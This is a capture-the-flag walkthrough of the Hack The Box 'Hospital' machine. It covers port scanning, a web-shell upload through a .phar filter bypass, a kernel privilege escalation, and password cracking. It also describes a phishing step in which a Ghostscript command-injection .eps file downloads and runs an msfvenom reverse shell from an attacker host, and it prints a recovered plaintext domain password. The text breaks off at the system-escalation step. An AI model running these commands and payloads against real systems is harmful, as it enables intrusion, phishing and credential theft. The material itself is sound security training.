# HTB - Hospital

### TL;DR
This is a Windows Server 2019 domain controller running 2 web servers, one on port 443 (xampp webmail) and another on port 8080 (apache). It is supposedly used by doctors in a hospital and a feature is enabled to upload medical records. This can be abused to upload a p0wny php shell and get access to a linux container runnig Ubuntu 22.04. Subsequently, this is rooted using a kernel exploit. Once we have rooted the container, we get credentials for an email account from which we can launch a phising attack to get access to the Windows machine. Write permissions on the 443 service web root allows us to upload a php reverse shell and get a system shell.

**Keywords:**<br>
file upload, gameoverlay, phising, ghostscript.

**References:**<br>
https://github.com/flozz/p0wny-shell<br>
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629<br>
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-18 15:35 EST
Nmap scan report for 10.129.70.232
Host is up, received user-set (0.041s latency).
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE          REASON
22/tcp   open  ssh              syn-ack
53/tcp   open  domain           syn-ack
88/tcp   open  kerberos-sec     syn-ack
135/tcp  open  msrpc            syn-ack
139/tcp  open  netbios-ssn      syn-ack
389/tcp  open  ldap             syn-ack
443/tcp  open  https            syn-ack
445/tcp  open  microsoft-ds     syn-ack
464/tcp  open  kpasswd5         syn-ack
593/tcp  open  http-rpc-epmap   syn-ack
636/tcp  open  ldapssl          syn-ack
1801/tcp open  msmq             syn-ack
2103/tcp open  zephyr-clt       syn-ack
2105/tcp open  eklogin          syn-ack
2107/tcp open  msmq-mgmt        syn-ack
2179/tcp open  vmrdp            syn-ack
3268/tcp open  globalcatLDAP    syn-ack
3269/tcp open  globalcatLDAPssl syn-ack
3389/tcp open  ms-wbt-server    syn-ack
5985/tcp open  wsman            syn-ack
6404/tcp open  boe-filesvr      syn-ack
6406/tcp open  boe-processsvr   syn-ack
6407/tcp open  boe-resssvr1     syn-ack
6409/tcp open  boe-resssvr3     syn-ack
6614/tcp open  unknown          syn-ack
6635/tcp open  mpls-udp         syn-ack
7326/tcp open  icb              syn-ack
8080/tcp open  http-proxy       syn-ack
9389/tcp open  adws             syn-ack

Nmap done: 1 IP address (1 host up) scanned in 95.25 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p$(cat port) -sV -sC -Pn -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-18 15:47 EST
Nmap scan report for 10.129.70.232
Host is up, received user-set (0.038s latency).
Scanned at 2023-11-18 15:47:25 EST for 103s

PORT     STATE SERVICE           REASON  VERSION
22/tcp   open  ssh               syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e14b4b3a6d18666939f7aa74b3160aaa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEOWkMB0YsRlK8hP9kX0zXBlQ6XzkYCcTXABmN/HBNeupDztdxbCEjbAULKam7TMUf0410Sid7Kw9ofShv0gdQM=
|   256 96c1dcd8972095e7015f20a24361cbca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGH/I0Ybp33ljRcWU66wO+gP/WSw8P6qamet4bjvS10R
53/tcp   open  domain            syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2023-11-19 03:47:37Z)
135/tcp  open  msrpc             syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1adfe746a788e36c0802abdf33119
| SHA-1: 17e58592278f4e8f8ce1554c35509c02282591e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
443/tcp  open  ssl/http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
| SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
445/tcp  open  microsoft-ds?     syn-ack
464/tcp  open  kpasswd5?         syn-ack
593/tcp  open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1adfe746a788e36c0802abdf33119
| SHA-1: 17e58592278f4e8f8ce1554c35509c02282591e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
1801/tcp open  msmq?             syn-ack
2103/tcp open  msrpc             syn-ack Microsoft Windows RPC
2105/tcp open  msrpc             syn-ack Microsoft Windows RPC
2107/tcp open  msrpc             syn-ack Microsoft Windows RPC
2179/tcp open  vmrdp?            syn-ack
3268/tcp open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1adfe746a788e36c0802abdf33119
| SHA-1: 17e58592278f4e8f8ce1554c35509c02282591e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
3269/tcp open  globalcatLDAPssl? syn-ack
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1adfe746a788e36c0802abdf33119
| SHA-1: 17e58592278f4e8f8ce1554c35509c02282591e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
3389/tcp open  ms-wbt-server     syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T03:48:34+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8aebc23231590c2351ebbf4e1d1dbc
| SHA-1: af104fad1b02073ae026eef48917734bf8e386a7
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQJ8MSkg5FM7tDDww5/eWcbjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5ob3NwaXRhbC5odGIwHhcNMjMwOTA1MTgzOTM0WhcNMjQw
| MzA2MTgzOTM0WjAaMRgwFgYDVQQDEw9EQy5ob3NwaXRhbC5odGIwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCsE7CcyqvqUyXdwU9hCSyg21qHJ3DGvSiq
| y9+Afp91IKJd35zkbYgFubrF5F4FLUzcHfcrNdBTw6oFMdNZS5txnjVIQfxoCk1f
| EUnONlIEdi9cattgsEzsNRRG9KJoLrNBIVyYAluMzSoaFF5I0lhSWTlv0ANsdTHz
| rzsc8Avs6BkKLsc03CKo4y3h+dzjWNOnwD1slvoA/IgoiJNPSlrHD01NPuD2Q93q
| 5Yr1mlbx9aew2M4gsEH1YO8k6JfTmVQNLApOVlhlRP/Ak2ZBCJz74UWagufguTSG
| dC/ucQHwe3K7qMD+DpxhMm5XaupkQFvxZdb6fQ8f8wgS6RhM/Ph9AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAXe9RRGaMAiYnxmhDqbb3nfY9wHPmO3P8CUgzWvA0cTKSbYEb5LCA0IBK
| 7v8svFcAQM94zOWisTu54xtuSiS6PcHfxYe0SJwl/VsZm52qt+vO45Zao1ynJdw/
| SnIeAIKktpq8rZZumYwy1Am65sIRZgw2ExFNfoAIG0wJqBDmsj8qcGITXoPUkAZ4
| gYyzUSt9vwoJpTdLQSsOiLOBWM+uQYnDaPDWxGWE38Dv27uW/KO7et97v+zdC+5r
| Dg8LvFWI0XDP1S7pEfIquP9BmnICI0S6s3kj6Ad/MwEuGnB9uRSokdttIDpvU4LX
| zXOe5MnTuI+omoq6zEeUs5It4jL1Yg==
|_-----END CERTIFICATE-----
5985/tcp open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             syn-ack Microsoft Windows RPC
6406/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             syn-ack Microsoft Windows RPC
6409/tcp open  msrpc             syn-ack Microsoft Windows RPC
6614/tcp open  msrpc             syn-ack Microsoft Windows RPC
6635/tcp open  msrpc             syn-ack Microsoft Windows RPC
7326/tcp open  msrpc             syn-ack Microsoft Windows RPC
8080/tcp open  http              syn-ack Apache httpd 2.4.55 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp open  mc-nmf            syn-ack .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-19T03:48:34
|_  start_date: N/A
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m03s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39109/tcp): CLEAN (Timeout)
|   Check 2 (port 57645/tcp): CLEAN (Timeout)
|   Check 3 (port 57392/udp): CLEAN (Timeout)
|   Check 4 (port 64779/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Nmap done: 1 IP address (1 host up) scanned in 104.73 seconds

```
Next step is to fuzz the HTTP service on port 8080.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 100 --fc 404 -e .php,.txt,.html -u http://hospital.htb:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hospital.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

.htpasswd.html          [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 83ms]
.htaccess.txt           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3503ms]
.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4478ms]
.htaccess.html          [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4481ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4481ms]
.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4506ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4526ms]
.htpasswd.txt           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4481ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 38ms]
failed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 49ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 46ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 63ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 45ms]
login.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 43ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
register.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 48ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 62ms]
success.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 39ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 41ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 111ms]
:: Progress: [81904/81904] :: Job [1/1] :: 2222 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```
We take note there is a folder called `uploads`.
### PHASE 2: User
Browse the site http://hospital.htb site, register a new account and sign in. An upload portal appears in firefox.

![hospital1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/e72cb32b-bff9-4799-af07-c6e719be738e)

Several extensions are filtered. After some trial and error, we find out the extension `.phar` is not filtered and can be uploaded; however, standard `.php` shell (such as pentest-monkey-php) are not stable, the only php shell which is working is a p0wny shell (https://github.com/flozz/p0wny-shell).<br>
To upload the shell, select an image file and intercept the message with burpsuite, then edit the request to add the p0wny shell code instead of the image binary code. The filter in place only checks the extension, and there is no magic bytes check, so there is no need to leave any `.jpg` header and all the image code can be replaced by the php code. Finally, change the extension to `phar`

![hospital2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/93cdd175-04c4-4807-a0b9-3feda1775082)

The the shell is uploaded in the `/uploads` folder.

![hospital3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/f64f11b4-8e22-49b3-99b7-1e0ec3d20016)

It can be accessed in firefox in the URL http://hospital.htb:8080/uploads/shell.phar. A p0wny php shell is spawned which we can use to get a reverse shell on the host.<br>
From the shell (probably a container), enumerate the system info.
```markdwon
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
Using the shell we find out `nc` is installed, so we can use it to get a reverse shell on the linux container.

![hospital4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/324721d3-d6de-4bca-90d7-c648ee28a9d8)

Once the reverse shell is received, the container can be rooted with a kernel exploit (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629). 

![hospital5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/0a7b628e-afbc-4bb3-a348-43a1cdcb78bc)

Since we are now root we can dump the hashes from the `/etc/shadow` file, unshadow them and crack with `john`, then we get credentials for user `drwillams` in the container.

```markdown
> unshadow passwd shadow > unshadowed

> john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:04 1.00% (ETA: 23:14:18) 0g/s 1369p/s 1369c/s 1369C/s light123..larajane
qwe123!@#        (?)
1g 0:00:02:37 DONE (2023-11-18 19:50) 0.006368g/s 1364p/s 1364c/s 1364C/s r55555..pucci
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Having this credential we log into the web mail server on https://hospital.htb as drwilliams@hospital.htb and read the doctor's email. Turns out a colleague is waiting for an email containing a ghostscript `.eps` file.

![hospital6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9ddaabae-2eff-4ff5-9cab-c8af1fc32ca4)

Knowing this, we prepare a phising attack for which we need to look for ghostscript vulnerabilities. Investigation leads to this exploit https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection, which allows injection of commands in `.eps` files.<br>
Next step is then to generate a `msfevenom`` payload for windows.
```markdown
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=1919 -f exe -a x64 --platform windows -o shell.exe
```
Now, to succeed in the phising attack, what seems to work is to divide the process in 2 steps.<brZ
First, inject a payload  in a `project.eps` file which will download the `shell.exe`.
```markwdown
> python3 ./exploit.py -g -p 'certutil -urlcache -split -f "http://10.10.xxx.xxx/shell.exe" shell.exe' -x eps
```
A file `malicious.eps` is generated. Rename it to `project.eps`
```markdown
> mv malicious.eps project.eps
```
Start a python HTTP server and reply the email attaching the `project.eps` file.

![hospital7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/caeb638c-f37c-4f1d-bd6f-8e637d9976e5)

Shortly after, a request on the python server is registered to download the `shell.exe` file.<br>
Next step is to execute the shell in the server. For this we will repeat the procedure but the command to be injected in hte `.eps` file will just execute the shell previously downloaded by the host.<br>
```markwdown
> python3 ./exploit.py -g -p 'shell.exe' -x eps
```
A file `malicious.eps` is generated. Rename it to `project.eps`
```markdown
> mv malicious.eps project.eps
```
Start a listener on port 1919 and reply the email again. Shortly after, a reverse shell is received for user `drbrown`.<br>
In the documents folder of user `drbrown` we find a file called `ghostscript.bat` which we inspect to get the user's password.
```markdwon
> type ghostscript.bat 
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
exit
```
We use this credential to login in the remote desktop service.

![hospital8](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/d8056ee1-b350-4138-a516-2c6c8d1ed6a7)

And finally we are able to get the `user.txt` flag.
### PHASE 3. System
Enumerate the system info.
```markdwon
>systeminfo

Host Name:                 DC
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA868
Original Install Date:     9/5/2023, 9:23:58 AM
System Boot Time:          11/17/2023, 11:11:31 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
```
To obtain a system reverse shell, we have to notice that the webserver service running on port 443 (webmail) is running as sytem and also we have write permissions on the webroot folder located in `c:\xampp\htdocs`.<br>
